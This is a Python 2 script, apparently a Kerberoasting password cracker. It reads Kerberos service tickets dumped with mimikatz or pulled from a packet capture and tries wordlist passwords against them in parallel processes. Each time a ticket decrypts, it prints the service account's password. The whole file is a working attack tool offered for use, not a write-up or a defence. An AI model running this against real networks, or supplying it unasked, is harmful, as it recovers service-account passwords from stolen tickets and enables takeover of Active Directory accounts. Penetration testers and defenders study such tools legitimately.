#!/usr/local/bin/python2 -tt

import kerberos
from pyasn1.codec.ber import encoder, decoder
from multiprocessing import Process, JoinableQueue, Manager
import glob

wordlist = JoinableQueue()
enctickets = None
#ENDOFQUEUE = 'ENDOFQUEUEENDOFQUEUEENDOFQUEUE'


def loadwordlist(wordlistfile, wordlistqueue, threadcount):
	for w in wordlistfile.xreadlines():
		wordlistqueue.put(w.strip(), True)
	wordlistfile.close()
	for i in range(threadcount):
		wordlist.put('ENDOFQUEUEENDOFQUEUEENDOFQUEUE')


def crack(wordlist):
	global enctickets

	toremove = []
	while enctickets:
		word = wordlist.get()
		if word == 'ENDOFQUEUEENDOFQUEUEENDOFQUEUE':
			break
		#print "trying %s" % word
		for et in enctickets:
			kdata, nonce = kerberos.decrypt(kerberos.ntlmhash(word), 2, et[0])
			if kdata:
				print 'found password for ticket %i: %s  File: %s' % (et[1], word, et[2])
				toremove.append(et)
		for et in toremove:
			try:
				enctickets.remove(et)
			except:
				return
			if not enctickets:
				return
					#print kdata.encode('hex')

if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Read kerberos ticket then modify it')
	parser.add_argument('-w', '--wordlist', dest='wordlistfile', action='store', required=True, 
					metavar='dictionary.txt', type=argparse.FileType('r'), 
					help='the word list to use with password cracking')
	parser.add_argument('files', nargs='+', help='File name to list. Use asterisk \'*\' for many files')
	parser.add_argument('-t', '--threads', dest='threads', action='store', required=False, 
					metavar='NUM', type=int, default=5,
					help='Number of threads for guessing')
	#parser.add_argument('files', action='store', nargs='+', #required=False, 
	#				metavar='INFILE.kirbi', type=file, 
	#				help='the file containing the kerberos ticket (exported with mimikatz) or export from extracttgsrepfrompcap.py')
	#parser.add_argument('-t', '--enctype', dest='enctype', action='store', required=False, default=2, 
	#				metavar='2', type=int, 
	#				help='message type, from RAM it is 2 (This should not need to be changed)')
	
	args = parser.parse_args()

	if args.threads < 1:
		raise ValueError("Number of threads is too small")

	p = Process(target=loadwordlist, args=(args.wordlistfile, wordlist, args.threads))
	p.start()

	
	#data = args.infile.read()
	#args.infile.close()

	# is this a dump from extactrtgsrepfrompcap.py or a dump from ram (mimikatz)

	#enctickets = []
	manager = Manager()
	enctickets = manager.list()

	i = 0
	for path in args.files:
		for f in glob.glob(path):
			with open(f, 'r') as fd:
				data = fd.read()
			#data = open('f.read()

			if data[0] == '\x76':
				# rem dump 
				enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
				i += 1
			elif data[:2] == '6d':
				for ticket in data.strip().split('\n'):
					#print str(decoder.decode(ticket.decode('hex'))[0][4][3][2])#[0][4][3][2]
					#exit()
					enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2]), i, f))
					i += 1

	#crack(wordlist)

	crackers = []
	for i in range(args.threads):
		p = Process(target=crack, args=(wordlist,))
		p.start()
		crackers.append(p)

	for p in crackers:
		p.join()

	wordlist.close()

	if len(enctickets):
		print "Unable to crack %i tickets" % len(enctickets)
	else:
		print "All tickets cracked!"
